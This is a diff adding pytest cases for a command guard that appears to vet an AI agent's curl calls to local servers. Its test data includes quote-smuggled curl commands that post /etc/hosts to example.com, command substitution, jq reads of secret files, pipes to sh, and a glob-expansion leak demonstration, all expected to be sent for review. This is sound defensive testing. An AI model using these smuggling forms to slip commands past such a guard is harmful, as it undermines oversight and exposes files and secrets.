@@ -1,5 +1,9 @@
 """Requests: only one plain curl call to a local server passes; every other request asks."""
 
+from pathlib import Path
+import shutil
+import subprocess
+
 import pytest
 
 from tests.runtime import load_script_module
@@ -112,3 +116,228 @@ def test_remote_requests_ask_and_point_to_safer_tools(capsys: pytest.CaptureFixt
     assert verdict.decision == "ask"
     assert REMOTE_REVIEW in verdict.reason
     assert capsys.readouterr() == ("", "")
+
+
+@pytest.mark.parametrize("suffix", ["", " | jq '.'"])
+@pytest.mark.parametrize(
+    "command",
+    [
+        r"curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:4399/app/",
+        r"curl -s -o /dev/null --write-out '%{http_code}\n' http://127.0.0.1:4399/app/",
+        "curl -s -D - --compressed -o /dev/null http://127.0.0.1:4411/x",
+        "curl -s --dump-header - --compressed -o /dev/null 'http://[::1]:4411/x'",
+    ],
+)
+def test_local_curl_fixed_diagnostics_are_allowed(command: str, suffix: str) -> None:
+    assert guard.decide("allowed", {"tool_input": {"command": command + suffix}}).decision == "allow"
+
+
+@pytest.mark.parametrize("suffix", ["", " | jq '.'"])
+@pytest.mark.parametrize(
+    "command",
+    [
+        r'curl -s -w "\"" -w https://example.com/ -d @/etc/hosts -w "\"" http://localhost/',
+        r'curl -s -w "\"" -w https://example.com/ -L -x https://example.com/ -K /etc/hosts -w "\"" http://localhost/',
+        r'curl -s -w "\\\"" -w https://example.com/ -d @/etc/hosts -w "\\\"" http://localhost/',
+        r'curl -s -w "\\\"" -L -x https://example.com/ -K /etc/hosts -w "\\\"" http://localhost/',
+        'curl -s -w "status" http://localhost/',
+        r'curl -s --write-out "%{http_code}\n" http://localhost/',
+    ],
+)
+def test_local_curl_double_quoted_write_out_asks(command: str, suffix: str) -> None:
+    assert guard.decide("allowed", {"tool_input": {"command": command + suffix}}).decision == "ask"
+
+
+@pytest.mark.parametrize("suffix", ["", " | jq '.'"])
+@pytest.mark.parametrize("option", ["-w", "--write-out"])
+@pytest.mark.parametrize(
+    "value",
+    [
+        "%output{/tmp/curl_output}text",
+        "%output{>>/tmp/curl_output}text",
+        "@/etc/hosts",
+        "%{stderr}text",
+        "%{stdout}text",
+        "%{json}",
+        "%header{set-cookie}",
+        "%{unknown}",
+        "%{http_code} %output{/tmp/curl_output}",
+        r"\t",
+        "$HOME",
+        "status!",
+        "status\n",
+    ],
+)
+def test_local_curl_unsafe_write_out_format_asks(value: str, option: str, suffix: str) -> None:
+    command = f"curl -s {option} '{value}' http://localhost/{suffix}"
+    assert guard.decide("allowed", {"tool_input": {"command": command}}).decision == "ask"
+
+
+@pytest.mark.parametrize("suffix", ["", " | jq '.'"])
+@pytest.mark.parametrize("option", ["-w", "--write-out"])
+@pytest.mark.parametrize(
+    "value",
+    [
+        "",
+        "Status: code=200 ok_1.2,/path-x",
+        r"%{http_code}\n%{time_total}\n%{time_connect}\n%{time_starttransfer}\n",
+        "%{size_download} %{content_type} %{url_effective} %{remote_ip}",
+    ],
+)
+def test_local_curl_safe_write_out_format_is_allowed(value: str, option: str, suffix: str) -> None:
+    command = f"curl -s {option} '{value}' http://localhost/{suffix}"
+    assert guard.decide("allowed", {"tool_input": {"command": command}}).decision == "allow"
+
+
+@pytest.mark.parametrize("suffix", ["", " | jq '.'"])
+@pytest.mark.parametrize(
+    "options",
+    [
+        "-o first -o second",
+        "-d 'first' -d 'second'",
+        "-X GET -X POST",
+        "-d 'data' -H 'Accept: x'",
+        "-o output -d 'data'",
+    ],
+)
+def test_local_curl_repeated_or_reordered_options_ask(options: str, suffix: str) -> None:
+    command = f"curl -s {options} http://localhost/{suffix}"
+    assert guard.decide("allowed", {"tool_input": {"command": command}}).decision == "ask"
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "curl -s -w '%{http_code}' https://example.com/",
+        "curl -s -L -w '%{http_code}' http://localhost/",
+        "curl -s -K config http://localhost/",
+        "curl -s --config config http://localhost/",
+        "curl -s -x proxy http://localhost/",
+        "curl -s --proxy proxy http://localhost/",
+        'curl -s "$URL"',
+        "curl -s -D headers.txt http://localhost/",
+        "curl -s --dump-header headers.txt http://localhost/",
+        'curl -s -w "$FORMAT" http://localhost/',
+        'curl -s -w "`id`" http://localhost/',
+        'curl -s -w "%{http_code}\\\n" http://localhost/',
+        "curl -s -w %{http_code} http://localhost/",
+    ],
+)
+def test_local_curl_diagnostics_keep_unsafe_forms_under_review(command: str) -> None:
+    assert guard.decide("allowed", {"tool_input": {"command": command}}).decision == "ask"
+
+
+@pytest.mark.parametrize(
+    "filters",
+    ["jq '.'", "jq -r '.status'", "head -n 10", "tail -c 20", "grep -i status", "wc -l", "jq '.' | head -n 5 | wc -l"],
+)
+def test_local_curl_read_only_pipeline_is_allowed(filters: str) -> None:
+    command = f"curl -s http://localhost:3000/api | {filters}"
+    assert guard.decide("allowed", {"tool_input": {"command": command}}).decision == "allow"
+
+
+@pytest.mark.parametrize("prefix", ["", "jq '.' | "])
+@pytest.mark.parametrize(
+    "argument",
+    [
+        r"\\*",
+        r"\*",
+        r"sta\tus",
+        "*",
+        "?",
+        "[ab]",
+        "{a,b}",
+        "~",
+        "$HOME",
+        "`pwd`",
+        "^README.md",
+        "a#",
+        "a##",
+        "a~b",
+        "(a|b)",
+        "a(.)",
+        '"status"',
+        '"^README.md"',
+        r"'safe'\\*",
+        "$'\\x2a'",
+    ],
+)
+def test_local_curl_filter_shell_expansions_ask(argument: str, prefix: str) -> None:
+    command = f"curl -s http://localhost:3000/api | {prefix}grep {argument}"
+    assert guard.decide("allowed", {"tool_input": {"command": command}}).decision == "ask"
+
+
+@pytest.mark.parametrize("filters", [r"jq \.", r"head -n \1", r"tail -c \2", r"wc -\l", r"grep sta\tus"])
+def test_local_curl_every_filter_requires_literal_words(filters: str) -> None:
+    command = f"curl -s http://localhost:3000/api | {filters}"
+    assert guard.decide("allowed", {"tool_input": {"command": command}}).decision == "ask"
+
+
+@pytest.mark.parametrize("argument", [r"\\*", "^README.md"])
+def test_local_curl_filter_globs_ask(argument: str) -> None:
+    command = f"curl -s http://localhost:3000/api | grep {argument}"
+    assert guard.decide("allowed", {"tool_input": {"command": command}}).decision == "ask"
+
+
+@pytest.mark.parametrize("argument", [r"\\*", "^README.md"])
+def test_local_curl_filter_globs_expand_to_local_files(tmp_path: Path, argument: str) -> None:
+    zsh = shutil.which("zsh")
+    if zsh is None:
+        pytest.skip("zsh is required to demonstrate glob expansion to local files")
+    names = [r"\.", r"\a", r"\b"] if argument.startswith("\\") else ["a", "b", "c"]
+    for name in ["README.md", *names]:
+        (tmp_path / name).write_text("a. repository secret\n")
+    command = f"curl -s http://localhost:3000/api | grep {argument}"
+    result = subprocess.run(
+        [zsh, "-f", "-c", "setopt extendedglob; curl() { print stdin; }; " + command],
+        cwd=tmp_path,
+        capture_output=True,
+        text=True,
+        check=True,
+    )
+    assert "repository secret" in result.stdout
+
+
+@pytest.mark.parametrize("argument", ["status", "'status'", r"'*?[]{}~$`^#()|!<>\\'", "'日本語'"])
+def test_local_curl_filter_literal_arguments_are_allowed(argument: str) -> None:
+    command = f"curl -s http://localhost:3000/api | grep {argument}"
+    assert guard.decide("allowed", {"tool_input": {"command": command}}).decision == "allow"
+
+
+@pytest.mark.parametrize(
+    "suffix",
+    [
+        "jq --rawfile secret secret.txt '.'",
+        "jq --slurpfile secret secret.json '.'",
+        "jq -f program.jq",
+        "jq --from-file program.jq",
+        "jq 'include \"program\"; .'",
+        "jq '. | input_filename'",
+        "jq --unknown '.'",
+        "grep -f patterns",
+        "grep --file patterns",
+        "grep --file=patterns",
+        "grep -ifpatterns",
+        "grep status secret.txt",
+        "head secret.txt",
+        "tail -F secret.txt",
+        "wc --files0-from=files",
+        "tee output.txt",
+        "sh",
+        "cat",
+        "jq '.' > output.txt",
+        "jq '.' && true",
+        "jq '.'; true",
+        "jq '.' &",
+        "jq '.' | curl http://localhost/",
+    ],
+)
+def test_local_curl_unsafe_or_uncertain_pipeline_asks(suffix: str) -> None:
+    command = f"curl -s http://localhost:3000/api | {suffix}"
+    assert guard.decide("allowed", {"tool_input": {"command": command}}).decision == "ask"
+
+
+@pytest.mark.parametrize("prefix", ["curl -L", "curl --proxy proxy", "curl -K config"])
+def test_local_curl_pipeline_preserves_curl_restrictions(prefix: str) -> None:
+    command = f"{prefix} http://localhost:3000/api | jq '.'"
+    assert guard.decide("allowed", {"tool_input": {"command": command}}).decision == "ask"
